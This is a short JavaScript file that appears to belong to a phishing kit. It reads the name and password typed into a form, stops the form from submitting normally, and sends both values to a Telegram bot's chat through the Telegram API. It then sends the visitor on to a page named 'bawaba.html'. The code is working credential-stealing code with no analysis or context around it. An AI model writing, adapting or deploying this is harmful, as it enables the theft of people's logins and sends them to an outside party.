
var ready = function () {
    name = document.getElementById("name").value;
    password = document.getElementById("password").value;
    message =  name +
        "\n\n\n" + password;
};
var sender = function (event) {
    event.preventDefault();
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = "./bawaba.html"
    });
    document.getElementById("number").value = "";

    return false;
};